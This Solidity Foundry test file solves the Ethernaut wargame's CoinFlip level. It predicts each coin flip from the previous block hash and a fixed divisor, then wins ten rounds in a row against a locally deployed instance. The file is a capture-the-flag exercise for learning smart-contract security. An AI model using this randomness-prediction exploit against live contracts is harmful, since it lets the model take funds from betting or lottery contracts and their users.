// SPDX-License-Identifier: MIT
pragma solidity ^0.8.10;

import "forge-std/Test.sol";
import {Ethernaut} from "../src/Ethernaut.sol";
import {CoinFlipFactory} from "../src/CoinFlip/CoinFlipFactory.sol";
import {CoinFlip} from "../src/CoinFlip/CoinFlip.sol";

contract CoinFlipTest is Test {
    Ethernaut ethernaut;
    address payable player;
    uint256 constant FACTOR =
        57896044618658097711785492504343953926634992332820282019728792003956564819968;

    function setUp() public {
        ethernaut = new Ethernaut();
        player = payable(
            address(uint160(uint256(keccak256(abi.encodePacked("player")))))
        );
        vm.label(player, "Player");
        vm.deal(player, 1 ether);
    }

    function testExploit() public {
        // Register level with Ethernaut contract
        CoinFlipFactory coinFlipFactory = new CoinFlipFactory();
        ethernaut.registerLevel(coinFlipFactory);

        // Get a new level instance
        vm.startPrank(player);
        address levelAddress = ethernaut.createLevelInstance(coinFlipFactory);
        CoinFlip coinFlipInstance = CoinFlip(payable(levelAddress));

        // Simulate exploit
        for (uint8 i = 0; i < 10; ++i) {
            coinFlipInstance.flip(calculateGuess(block.number));
            vm.roll(block.number + 1);
        }
        bool levelSuccessFullyPassed = ethernaut.submitLevelInstance(
            payable(levelAddress)
        );
        vm.stopPrank();
        assert(levelSuccessFullyPassed);
    }

    function calculateGuess(uint256 _blockNumber) public view returns (bool) {
        uint256 blockValue = uint256(blockhash(_blockNumber - 1));
        uint256 coinFlip = blockValue / FACTOR;
        return (coinFlip == 1);
    }
}
